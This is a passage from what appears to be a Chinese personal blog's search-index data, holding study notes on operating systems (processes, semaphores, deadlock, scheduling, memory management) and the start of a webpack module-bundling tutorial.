title=\"进程控制原语\"></a>进程控制原语</h4><p>1、进程创建原语<br>从PCB集合中申请一个空白的PCB，将调用者参数（如进程外部标识符，初始CPU状态，进程优先数，初始内存及申请资源清单）添入该PCB，设置记账数据。置新进程为“就绪”态。</p>\n<p>2、终止进程原语<br>用于终止完成的进程，回收其所占资源。包括消去其资源描述块，消去进程的PCB。</p>\n<p>3、阻塞原语<br>将进程从运行态变为阻塞态。进程被插入等待事件的队列，同时修改PCB中相应的表项，如进程状态和等待队列指针。</p>\n<p>4、唤醒原语<br>将进程从阻塞态变为就绪态。进程从阻塞队列移出，插入就绪队列，等待调度，同时修改PCB中相应的表项，如进程状态。</p>\n<h4 id=\"线程的定义、与进程的区别。\"><a href=\"#线程的定义、与进程的区别。\" class=\"headerlink\" title=\"线程的定义、与进程的区别。\"></a>线程的定义、与进程的区别。</h4><p> 线程：线程是进程中的一个实体，作为系统调度和分派的基本单位。</p>\n<p>进程：指在系统中能独立运行并作为资源分配的基本单位，它是由一组机器指令、数据和堆栈等组成的，是一个能独立运行的活动实体。</p>\n<h4 id=\"多核、多线程与超线程\"><a href=\"#多核、多线程与超线程\" class=\"headerlink\" title=\"多核、多线程与超线程\"></a>多核、多线程与超线程</h4><p>物理CPU：<br>物理CPU就是插在主机上的真实的CPU硬件，在Linux下可以数不同的physical id 来确认主机的物理CPU个数。 </p>\n<p> 核心数：<br>我们常常会听说多核处理器，其中的核指的就是核心数。在Linux下可以通过cores来确认主机的物理CPU的核心数。</p>\n<p> 逻辑CPU：<br>逻辑CPU跟超线程技术有联系，假如物理CPU不支持超线程的，那么逻辑CPU的数量等于核心数的数量；<br>如果物理CPU支持超线程，那么逻辑CPU的数目是核心数数目的两倍。在Linux下可以通过 processors 的数目来确认逻辑CPU的数量。</p>\n<p> 超线程：<br>超线程是英特尔开发出来的一项技术，使得单个处理器可以象两个逻辑处理器那样运行，这样单个处理器以并行执行线程。<br>这里的单个处理器也可以理解为CPU的一个核心；这样便可以理解为什么开启了超线程技术后，逻辑CPU的数目是核心数的两倍了。</p>\n<p>超线程技术实现并行操作的原理？</p>\n<p>一个线程在执行时会占用CPU资源，其他线程想要得到执行就必须等待该线程将CPU资源让出。</p>\n<p>利用超线程技术，模拟出的两个逻辑内核共享同一个CPU资源，所以同一时刻可以有两个线程都占用CPU资源，因此这两个线程都可以得到执行，这就是实现同一时间执行两个线程的并行操作。    </p>\n<p>1）Processing Unit（运算处理单元），简称PU</p>\n<p>2）Architectual State（架构状态单元），简称AS</p>\n<p>PU一般就是执行运算，比如算数运算加减乘除。AS执行一些逻辑和调度方面的操作，比如控制内存访问等。</p>\n<p>单核CPU（先从简单的谈起）</p>\n<p>一般一块传统意义的CPU上会有一个PU、一个AS。</p>\n<p>多核CPU</p>\n<p>这里说的多核，是多个物理核，比如i3的双核，i5的4核。这中架构下，每一个物理核都有一个PU和一个AS。所以。对于i3来说，就有总共两个PU，两个AS。对于i5来说，就有总过4个PU，4个AS。</p>\n<p>超线程技术(HT)</p>\n<p>超线程(HT)并不是我们一般说的多线程。我们一般说的多线程（multi-threading）是指程序方面的，简单的说就是‘软’的，代码级别的。而超线程一般指的是硬件架构方面的，是‘硬’的：通过调整AS而模拟出来的‘逻辑核’。</p>\n<p>简单的说吧，超线程就是一个物理核里面，有两个AS，一个PU。两个AS共享一个PU。</p>\n<p>多CPU成本高，功耗大，而超线程技术又不等同于两个CPU的性能，而且时常会碰到两个线程需要使用同一资源时必须停止一个线程的现象。多核结构就是在一个CPU里面布置两个执行核，即两套执行单元，如ALU、FPU和L2缓存，其余部分两个核共享。这样单个CPU的功耗效率也高。其指令将是真的并行，而不是超线程结构的半个并行。</p>\n<h3 id=\"第三章-互斥与同步\"><a href=\"#第三章-互斥与同步\" class=\"headerlink\" title=\"第三章 互斥与同步\"></a>第三章 互斥与同步</h3><h4 id=\"并发进程产生与时间有关错误\"><a href=\"#并发进程产生与时间有关错误\" class=\"headerlink\" title=\"并发进程产生与时间有关错误\"></a>并发进程产生与时间有关错误</h4><p>由于并发程序的随机性，一个进程对另一个进程的影响是不可预测的。由于他们共享了资源，在不同时刻交替访问资源的时候可能造成结果的不正确。</p>\n<h4 id=\"临界区，对临界区的管理要求；\"><a href=\"#临界区，对临界区的管理要求；\" class=\"headerlink\" title=\"临界区，对临界区的管理要求；\"></a>临界区，对临界区的管理要求；</h4><p>临界区就是并发进程与共享变量有关的程序代码段，而把该共享变量代表的共享资源称为临界资源。</p>\n<p>1.不存在有关进程间相对推进速度，系统内有多个CPU的假定</p>\n<p>2.一次最多只能有一个进程进入临界区，也即没有两个或两个以上的进程能够同时进入临界区，当有一个进程在临界区内，其他想进入临界区的进程必须等待。</p>\n<p>3.不能让一个进程在临界区内无限制地运行下去，在临界区中的进程必须在有限时间内运行结束而离开结束</p>\n<p>4.等待进入临界区的进程，在时间上不能被无限推迟。</p>\n<h4 id=\"信号量的定义，其物理意义；\"><a href=\"#信号量的定义，其物理意义；\" class=\"headerlink\" title=\"信号量的定义，其物理意义；\"></a>信号量的定义，其物理意义；</h4><p>​    信号量一般时由两个成员组成的数据结构，其中一个成员时是整型变量，表示该信号的值，他是与相应资源的使用情况相关；另一个是指向PCB的指针。当多个进程都等待同一个信号量时，他们就排成一个队列，有信号量的指针项指出该队列的头。</p>\n<p>​    信号量的物理意义如下： (1) 若信号量s为正值，则该值等于在封锁进程之前对信号量s可施行的P操作数， 亦即等于s所代表的实际使用的物理资源个数。 (2) 若信号量s为负值，则其绝对值等于登记排列在该信号量s队列之中等待进程的个数， 亦即恰好等于对信号量s实施P操作而被封锁起来并进入信号量s队列的进程数。 (3) 通常P操作意味着请求一个资源，V操作意味着释放一个资源。 在一定条件下，P操作代表挂起进程操作，而V操作代表唤醒被挂起进程的操作。</p>\n<p>原语概念； </p>\n<h4 id=\"用信号量实现进程互斥与同步；\"><a href=\"#用信号量实现进程互斥与同步；\" class=\"headerlink\" title=\"用信号量实现进程互斥与同步；\"></a>用信号量实现进程互斥与同步；</h4><p>关于PV操作容易产生的一些疑问：</p>\n<p>1，S大于0那就表示有临界资源可供使用，为什么不唤醒进程？</p>\n<p>S大于0的确表示有临界资源可供使用，也就是说这个时候没有进程被阻塞在这个资源上，所以不需要唤醒。</p>\n<p>2，S小于0应该是说没有临界资源可供使用，为什么还要唤醒进程？</p>\n<p>V原语操作的本质在于：一个进程使用完临界资源后，释放临界资源，使S加1，以通知其它的进程，这个时候如果S&lt;0，表明有进程阻塞在该类资源上，因此要从阻塞队列里唤醒一个进程来“转手”该类资源。比如，有两个某类资源，四个进程A、B、C、D要用该类资源，最开始S=2，当A进入，S=1，当B进入S=0，表明该类资源刚好用完，  当C进入时S=-1，表明有一个进程被阻塞了，D进入，S=-2。当A用完该类资源时，进行V操作，S=-1，释放该类资源，因为S&lt;0，表明有进程阻塞在该类资源上，于是唤醒一个。</p>\n<p>3，如果是互斥信号量的话，应该设置信号量S=1，但是当有5个进程都访问的话，最后在该信号量的链表里会有4个在等待，也是说S=-4，那么第一个进程执行了V操作使S加1，释放了资源，下一个应该能够执行，但唤醒的这个进程在执行P操作时因S&lt;0，也还是执行不了，这是怎么回事呢？</p>\n<p>当一个进程阻塞了的时候，它已经执行过了P操作，并卡在临界区那个地方。当唤醒它时就立即进入它自己的临界区，并不需要执行P操作了，当执行完了临界区的程序后，就执行V操作。</p>\n<p>4，S的绝对值表示等待的进程数，同时又表示临界资源，这到底是怎么回事？</p>\n<p>当信号量S小于0时，其绝对值表示系统中因请求该类资源而被阻塞的进程数目.S大于0时表示可用的临界资源数。注意在不同情况下所表达的含义不一样。当等于0时，表示刚好用完。</p>\n<h4 id=\"直接通信，间接通信；\"><a href=\"#直接通信，间接通信；\" class=\"headerlink\" title=\"直接通信，间接通信；\"></a>直接通信，间接通信；</h4><p>进程间通信从通信路径上可分为直接通信和间接通信。</p>\n<p>直接通信：进程A直接将信息发给B（不经过内核倒一次）；</p>\n<p>间接通信：进程A先把信息发给内核，内核再将信息发给B。</p>\n<h4 id=\"死锁的定义，四个必要条件；-死锁的防止；\"><a href=\"#死锁的定义，四个必要条件；-死锁的防止；\" class=\"headerlink\" title=\"死锁的定义，四个必要条件； 死锁的防止；\"></a>死锁的定义，四个必要条件； 死锁的防止；</h4><p>死锁是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。 此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。</p>\n<p>死锁产生的四个必要条件。</p>\n<ol>\n<li><p>互斥条件：资源是独占的且排他使用，进程互斥使用资源，即任意时刻一个资源只能给一个进程使用，其他进程若申请一个资源，而该资源被另一进程占有时，则申请者等待直到资源被占有者释放。</p>\n</li>\n<li><p>不可剥夺条件：进程所获得的资源在未使用完毕之前，不被其他进程强行剥夺，而只能由获得该资源的进程资源释放。</p>\n</li>\n<li><p>请求和保持条件：进程每次申请它所需要的一部分资源，在申请新的资源的同时，继续占用已分配到的资源。</p>\n</li>\n<li><p>循环等待条件：在发生死锁时必然存在一个进程等待队列{P1,P2,…,Pn},其中P1等待P2占有的资源，P2等待P3占有的资源，…，Pn等待P1占有的资源，形成一个进程等待环路，环路中每一个进程所占有的资源同时被另一个申请，也就是前一个进程占有后一个进程所深情地资源</p>\n<p>以上给出了导致死锁的四个必要条件，只要系统发生死锁则以上四个条件至少有一个成立。事实上循环等待的成立蕴含了前三个条件的成立，似乎没有必要列出然而考虑这些条件对死锁的预防是有利的，因为可以通过破坏四个条件中的任何一个来预防死锁的发生。</p>\n</li>\n</ol>\n<p>死锁的防止主要通过</p>\n<p>（1) 打破互斥条件。即允许进程同时访问某些资源。但是，有的资源是不允许被同时访问的，像打印机等等，这是由资源本身的属性所决定的。所以，这种办法并无实用价值。 </p>\n<p>（2) 打破不可抢占条件。即允许进程强行从占有者那里夺取某些资源。就是说，当一个进程已占有了某些资源，它又申请新的资源，但不能立即被满足时，它必须释放所占有的全部资源，以后再重新申请。它所释放的资源可以分配给其它进程。这就相当于该进程占有的资源被隐蔽地强占了。这种预防死锁的方法实现起来困难，会降低系统性能。  </p>\n<p>（3) 打破占有且申请条件。可以实行资源预先分配策略。即进程在运行前一次性地向系统申请它所需要的全部资源。如果某个进程所需的全部资源得不到满足，则不分配任何资源，此进程暂不运行。只有当系统能够满足当前进程的全部资源需求时，才一次性地将所申请的资源全部分配给该进程。由于运行的进程已占有了它所需的全部资源，所以不会发生占有资源又申请资源的现象，因此不会发生死锁。但是，这种策略也有如下缺点： </p>\n<p>​    [1]在许多情况下，一个进程在执行之前不可能知道它所需要的全部资源。这是由于进程在执行时是动态的，不可预测的; </p>\n<p>​    [2]资源利用率低。无论所分资源何时用到，一个进程只有在占有所需的全部资源后才能执行。即使有些资源最后才被该进程用到一次，但该进程在生存期间却一直占有它们，造成长期占着不用的状况。这显然是一种极大的资源浪费； </p>\n<p>​    [3]降低了进程的并发性。因为资源有限，又加上存在浪费，能分配到所需全部资源的进程个数就必然少了。  </p>\n<p>  4）打破循环等待条件，实行资源有序分配策略。采用这种策略，即把资源事先分类编号，按号分配，使进程在申请，占用资源时不会形成环路。所有进程对资源的请求必须严格按资源序号递增的顺序提出。进程占用了小号资源，才能申请大号资源，就不会产生环路，从而预防了死锁。这种策略与前面的策略相比，资源的利用率和系统吞吐量都有很大提高，但是也存在以下缺点： </p>\n<p>​    [1]限制了进程对资源的请求，同时给系统中所有资源合理编号也是件困难事，并增加了系统开销； </p>\n<p>​    [2]为了遵循按编号申请的次序，暂不使用的资源也需要提前申请，从而增加了进程对资源的占用时间。</p>\n<p>实际中死锁的防止主要通过破坏部分分配条件和循环等待条件实现，主要方法有资源静态分配法和资源的层次分配法</p>\n<p>1.资源静态分配法：在执行前必须获得它执行所需的所有资源，所有得到满足后才能运行，较为苛刻。</p>\n<p>2.资源的层次分配法： 把资源分成多个层次，一个进程获得某一层的资源后只能获得更高一层的资源，释放则反过来，先高层再到低层</p>\n<h4 id=\"死锁的避免银行家算法；\"><a href=\"#死锁的避免银行家算法；\" class=\"headerlink\" title=\"死锁的避免银行家算法；\"></a>死锁的避免银行家算法；</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226221310025.png\" alt=\"image-20211226221310025\"></p>\n<p>银行家算法的核心它通过自己特有的算法，在每次奉陪给进程系统资源前，先试探性的“假设”分配资源给进程Pi,再通过安全性算法检测此次分配是否会导致系统进入不安全状态，如果分配后系统依然安全则系统将资源正是分配给进程Pi;如果此次分配导致系统进入不安全状态，则暂不分配资源给进程Pi。通过这种机制，系统可以有效的避免死锁的产生，确保系统时时刻刻都处在安全状态。</p>\n<h4 id=\"死锁的检测与恢复\"><a href=\"#死锁的检测与恢复\" class=\"headerlink\" title=\"死锁的检测与恢复\"></a>死锁的检测与恢复</h4><p>基于等待图法，判断等待图中是否有环，有环则有死锁。产生死锁后恢复方法有1.撤销进程法2.剥夺资源法</p>\n<h3 id=\"第四章-处理机调度\"><a href=\"#第四章-处理机调度\" class=\"headerlink\" title=\"第四章 处理机调度\"></a>第四章 处理机调度</h3><h4 id=\"处理器调度层次\"><a href=\"#处理器调度层次\" class=\"headerlink\" title=\"处理器调度层次\"></a>处理器调度层次</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226221950830.png\" alt=\"image-20211226221950830\"></p>\n<ul>\n<li>高级调度（作业调度）：根据某种算法，选择外存上的后备队列中的几个作业放入内存，并为之创建进程，分配资源。然后将其放入就绪队列。</li>\n<li>中级调度（内存调度）：将暂时无法运行的进程调至外存等待（挂起状态）。当这些进程又具备运行条件，且内存有空余时，通过中级调度将这些进程重新调入内存，并且修改状态为就绪状态。</li>\n<li>低级调度（进程调度）：根据某种算法，从就绪队列中选择某些进程分配处理机资源。</li>\n</ul>\n<h4 id=\"调度准则\"><a href=\"#调度准则\" class=\"headerlink\" title=\"调度准则\"></a>调度准则</h4><p>不同的调度算法具有不同的特性，在选择调度算法时，必须考虑算法所具有的特性。为了比较处理机调度算法的性能，人们提出很多评价准则，下面介绍主要的几种：</p>\n<p>(1) CPU利用率。CPU是计算机系统中最重要和昂贵的资源之一，所以应尽可能使CPU 保持“忙”状态，使这一资源利用率最髙。</p>\n<p>(2) 系统吞吐量。表示单位时间内CPU完成作业的数量。长作业需要消耗较长的处理机时间，因此会降低系统的吞吐量。而对于短作业，它们所需要消耗的处理机时间较短，因此能提高系统的吞吐量。调度算法和方式的不同，也会对系统的吞吐量产生较大的影响。</p>\n<p>(3) 周转时间。是指从作业提交到作业完成所经历的时间，包括作业等待、在就绪队列中排队、在处迤机上运行以及进行输入/输出操作所花费时间的总和。</p>\n<p>作业的周转时间可用公式表示如下：<br>周转时间 = 作业完成时间 - 作业提交时间</p>\n<p>平均周转时间是指多个作业周转时间的平均值：<br>平均周转时间 = (作业1的周转时间 + … + 作业 n 的周转时间) / n</p>\n<p>带权周转时间是指作业周转时间与作业实际运行时间的比值：<br><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226222309550.png\" alt=\"image-20211226222309550\"></p>\n<p>平均带权周转时间是指多个作业带权周转时间的平均值：<br>平均带权周转时间 = (作业1的带权周转时间 + … + 作业 n 的带权周转时间) / n</p>\n<p>(4) 等待时间。=开始时间—提交时间。</p>\n<p>是指进程处于等处理机状态时间之和，等待时间越长，用户满意度越低。处理机调度算法实际上并不影响作业执行或输入/输出操作的时间，只影响作业在就绪队列中等待所花的时间。因此，衡量一个调度算法优劣常常只需简单地考察等待时间。</p>\n<p>(5) 响应时间。是指从用户提交请求到系统首次产生响应所用的时间。在交互式系统中，周转时间不可能是最好的评价准则，一般釆用响应时间作为衡量调度算法的重要准则之一。从用户角度看，调度策略应尽量降低响应时间，使响应时间处在用户能接受的范围之内。</p>\n<p>要想得到一个满足所有用户和系统要求的算法几乎是不可能的。设计调度程序，一方面要满足特定系统用户的要求（如某些实时和交互进程快速响应要求)，另一方面要考虑系统整体效率（如减少整个系统进程平均周转时间），同时还要考虑调度算法的开销。</p>\n<h4 id=\"短程调度算法\"><a href=\"#短程调度算法\" class=\"headerlink\" title=\"短程调度算法\"></a>短程调度算法</h4><h4 id=\"一单处理器调度算法\"><a href=\"#一单处理器调度算法\" class=\"headerlink\" title=\"一单处理器调度算法\"></a>一单处理器调度算法</h4><p>​        短程调度的算法有：先来先服务（FCFS)，时间片轮转法，最短进程优先，最短剩余时间优先，最高响应比优先，<strong>多级反馈队列</strong>等。</p>\n<h4 id=\"一多处理器调度算法\"><a href=\"#一多处理器调度算法\" class=\"headerlink\" title=\"一多处理器调度算法\"></a>一多处理器调度算法</h4><p>​    多处理器调度是根据处理器调度策略每次取出一个任务，将任务分配到处理器上运行的方法。多处理器调度包括给处理器分配进程、在单个处理器上是否使用多道程序技术、实际分派进程三个相关的方面。<a href=\"https://baike.baidu.com/item/%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%B3%BB%E7%BB%9F/8191804\">多处理器系统</a>中线程调度通常有负载共享、成组调度、专用处理器分配、动态调度四种方式。</p>\n<p><a href=\"https://www.cnblogs.com/cjsword/p/12192061.html\">实时调度 - sword23 - 博客园 (cnblogs.com)</a></p>\n<h4 id=\"实时调度\"><a href=\"#实时调度\" class=\"headerlink\" title=\"实时调度\"></a>实时调度</h4><p>常用方法：</p>\n<p>1.频率单调调度算法</p>\n<p>基本思想：为每个进程分配一个与事件发生频率成正比的优先级，运行频率越高（运行周期越短）的进程优先级越高，系统优先调度高优先级进程占有处理机运行，是抢占式调度。</p>\n<p>2.时限调度算法</p>\n<p>基本思想：按用户的实现要求顺序设置优先级，优先级高者占有处理机，即时限要求最近的任务优先占有处理机。时限又有两种：处理开始时限与处理结束时限。是抢占式调度。</p>\n<p>3.最小裕度法</p>\n<p>基本思想：首先计算每个进程的富裕时间（裕度），然后选择裕度最少的进程执行。</p>\n<p>计算公式为：裕度=截止时间-（就绪时间+计算时间），裕度小说明时间紧迫，就绪后尽快让其运行</p>\n<h3 id=\"第五章-存储管理\"><a href=\"#第五章-存储管理\" class=\"headerlink\" title=\"第五章 存储管理\"></a>第五章 存储管理</h3><h4 id=\"存储管理的功能、存储分配的三种方式：\"><a href=\"#存储管理的功能、存储分配的三种方式：\" class=\"headerlink\" title=\"存储管理的功能、存储分配的三种方式：\"></a>存储管理的功能、存储分配的三种方式：</h4><p>存储管理可不仅是对<strong>外部存储</strong>资源（如磁盘文件）进行的管理，也包括了对<strong>内存</strong>的管理。内外存的资源管理技术可以相同，也可以不同，但一般情况下，都采用相同的管理技术。</p>\n<p>存储管理主要是完成如下功能：<em>存储分配</em>，<em>存储共享</em>，<em>存储保护</em>，<em>存储扩充</em>，<em>地址映射</em>。</p>\n<p>内存分配有三种方式：</p>\n<p>一：从全局存储区域分配：这时内存在程序编译阶段就已经分配好，该内存在程序运行的整个周期都有效，如：全局变量、static静态变量。</p>\n<p>二：从栈区分配：在执行函数的时候，函数中的局部变量的存储单元都可以从栈中分配，函数执行结束后这些存储单元都会被自动释放，实现从栈中分配存储单元运算操作内置于处理器的指令集中，效率很高 但是分配的内存容量有限。</p>\n<p>三：从堆中分配：也称为动态内存分配，在程序运行期间，可以使用malloc和new申请任意数量的内存单元，由程序员决定在什么时候使用free和delete释放内存。</p>\n<h4 id=\"重定位的定义、两种重定位的特点与区别\"><a href=\"#重定位的定义、两种重定位的特点与区别\" class=\"headerlink\" title=\"重定位的定义、两种重定位的特点与区别\"></a>重定位的定义、两种重定位的特点与区别</h4><p>​    重定位有静态重定位和动态重定位两种类型。</p>\n<p>由于一个作业装入到与其逻辑地址空间不一致的绝对地址空间，使得逻辑地址与绝对地址不同，而引起的对有关地址部分的调整，即逻辑地址转换成绝对地址的过程称为重定位，也称为地址转换。<br>重定位有静态重定位和动态重定位两种类型。<br>·  在装入一个作业的时候，把作业中的指令地址和数据地址全部一次性地转换成绝对地址；<br>·  由软件和硬件相配合来实现的。地址重定位不再是装入的时候一次完成了，而是设置一个基址寄存器，装入作业的时候，将作业在主存区域的首地址放入到基址寄存器中．作业执行的时候，由硬件的地址转换机构动态地对地址进行转换，指令执行的时候，只要将逻辑地址加上基址寄存器的内容，就得到了绝对地址。<br>    静态重定位和动态重定位的不同在于：<br>·  静态重定位是在作业装入的时候一次完成，动态重定位是在作业执行时再实现的；<br>·  静态重定位是软件支持的，动态重定位是软件和硬件相互配合实现的；<br>·  静态重定位不能实现主存的移动，而动态重定位可以；<br>·  动态重定位还可能提供虚拟存储空间。</p>\n<h4 id=\"覆盖与交换\"><a href=\"#覆盖与交换\" class=\"headerlink\" title=\"覆盖与交换\"></a>覆盖与交换</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226234324489.png\" alt=\"image-20211226234324489\"></p>\n<p> 分区存储管理、页式存储管理 各种方法采用的分配回收算法，数据结构，地址变换 过程，共享与保护，优缺点比较) 虚拟存储器基本思想，页式虚拟存储工作流程， </p>\n<p>常用的页面置换算法(FIFO,LRU,OPT,CLOCK, NRU,LFU) </p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112041103.png\" alt=\"image-20211227112041103\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112053980.png\" alt=\"image-20211227112053980\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112014461.png\" alt=\"image-20211227112014461\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112118941.png\" alt=\"image-20211227112118941\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112158709.png\" alt=\"image-20211227112158709\"></p>\n<p>段式存储管理的思想，</p>\n<h4 id=\"段式虚拟存储管理流程。\"><a href=\"#段式虚拟存储管理流程。\" class=\"headerlink\" title=\"段式虚拟存储管理流程。\"></a><a src=\"https://www.cnblogs.com/wkfvawl/p/11733057.html\">段式虚拟存储管理流程。</a></h4><p> 习题</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112240605.png\" alt=\"image-20211227112240605\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112255027.png\" alt=\"image-20211227112255027\"></p>\n<h3 id=\"第六章-文件管理\"><a href=\"#第六章-文件管理\" class=\"headerlink\" title=\"第六章 文件管理\"></a>第六章 文件管理</h3><h4 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h4><h4 id=\"文件目录\"><a href=\"#文件目录\" class=\"headerlink\" title=\"文件目录\"></a>文件目录</h4><h4 id=\"文件共享与保护\"><a href=\"#文件共享与保护\" class=\"headerlink\" title=\"文件共享与保护\"></a>文件共享与保护</h4><h4 id=\"文件存储空间的管理\"><a href=\"#文件存储空间的管理\" class=\"headerlink\" title=\"文件存储空间的管理\"></a>文件存储空间的管理</h4><h4 id=\"文件分配\"><a href=\"#文件分配\" class=\"headerlink\" title=\"文件分配\"></a>文件分配</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211227112353716.png\" alt=\"image-20211227112353716\"></p>\n<h3 id=\"第七章-IO管理\"><a href=\"#第七章-IO管理\" class=\"headerlink\" title=\"第七章 IO管理\"></a>第七章 IO管理</h3><p>I/O管理概述 </p>\n<p>I/O控制方式 </p>\n<p>I/0缓冲 </p>\n<p>设备驱动程序 </p>\n<p>设备分配 </p>\n<p>磁盘存储器的管理</p>\n<p>常用调度算法 </p>\n<p>FCFS: 先进先出算法</p>\n<p>SSTF: 最短寻道算法</p>\n<p>SCAN： 电梯算法，不撞南墙不回头</p>\n<p>C-SCAN： 循环扫描电梯算法,单向移动，回返时直接回到起点</p>\n","categories":["操作系统"],"tags":["计算机"]},{"title":"webpack小插曲","url":"/p/66004/","content":"<h2 id=\"模块化开发，（导入与导出）\"><a href=\"#模块化开发，（导入与导出）\" class=\"headerlink\" title=\"模块化开发，（导入与导出）\"></a>模块化开发，（导入与导出）</h2><h2 id=\"js导入\"><a href=\"#js导入\" class=\"headerlink\" title=\"js导入\"></a>js导入</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220210102806191.png\" alt=\"image-20220210102806191\"></p>\n<p>js刚开始只是为了具备初始逻辑，简单功能。但是到了后面发展过于迅速与复杂，多人开发时有可能会有命名冲突。于是打算使用匿名立即执行函数（闭包）实现，但是这样无法实现函数的复用，于是诞生了模块化，将所有需要导出的变量以及函数保存到一个对象上，这个立即执行函数就只返回这个对象，返回的这个对象就称为一个模块。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220209210426986.png\" alt=\"image-20220209210426986\"></p>\n<p>如今模块化开发直接成为了一种规范，只要按照规范开发</p>\n<p>常见的模块化规范：</p>\n<ul>\n<li>CommonJS、AMD、CMD、ES6的Modules</li>\n</ul>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220209210837126.png\" alt=\"image-20220209210837126\"></p>\n<ul>\n<li><p>导出方式一<code>export&#123;a,b,c&#125;</code></p>\n</li>\n<li><p>导出方式二</p>\n<p>  <code>export var a=120</code>,<code>export var b=113</code></p>\n<p>  <code>export function aaa(num1,num2)&#123;return num1+num2&#125;</code></p>\n<p>  <code>export class Person&#123;&#125;</code></p>\n</li>\n</ul>\n<p>自命名<code>export default aaa</code>，一个js文件只能存在一个，使用时<code>import 自己命的名 from &#39;./aaa.js&#39;</code></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220209212847687.png\" alt=\"image-20220209212847687\"></p>\n<p>import * as 对象名 from ‘xxxx.js’ 可以将所有的导出保存到一个对象中，用的时候直接对象. 使用</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220209213915145.png\" alt=\"image-20220209213915145\"></p>\n<p><strong><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220210100733373.png\" alt=\"image-20220210100733373\"></strong></p>\n<p><strong>无论采用什么样的模块化开发规范比如AMD、CMD、CommonJS、ES6，最终采用webpack打包后都能使用，webpack会处理好所有的依赖关系。</strong></p>\n<h2 id=\"webpack-config-js的编写\"><a href=\"#webpack-config-js的编写\" class=\"headerlink\" title=\"webpack.config.js的编写\"></a>webpack.config.js的编写</h2><p>需要先npm init 生成package.json配置文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//动态获取路径</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;path&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports=&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">entry</span>:<span class=\"string\">&#x27;./src/main.js&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">output</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">path</span>:path.resolve(__dirname,<span class=\"string\">&#x27;dist&#x27;</span>),</span><br><span class=\"line\">        <span class=\"attr\">filename</span>:<span class=\"string\">&#x27;bundle.js&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>package.json,安装本地webpack，区分开发时依赖以及运行时依赖</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;name&quot;</span>: <span class=\"string\">&quot;webpackstart&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;version&quot;</span>: <span class=\"string\">&quot;1.0.0&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;description&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;main&quot;</span>: <span class=\"string\">&quot;index.js&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;scripts&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;test&quot;</span>: <span class=\"string\">&quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;build&quot;</span>: <span class=\"string\">&quot;webpack&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"string\">&quot;author&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;license&quot;</span>: <span class=\"string\">&quot;ISC&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;devDependencies&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;webpack&quot;</span>: <span class=\"string\">&quot;^3.6.0&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"css导入\"><a href=\"#css导入\" class=\"headerlink\" title=\"css导入\"></a>css导入</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220210154130234.png\" alt=\"image-20220210154130234\"></p>\n<p><strong>安装style-loader（挂载）与css-loader（加载），解析顺序是从右往左</strong>，最后记得在main.js中引入css文件。</p>\n<p>less文件也同理，需要3个loader，额外需要一个less-loader，先下载好loader，在webpack.config.js中配置好test（选择的文件）和use（使用的loader）</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img 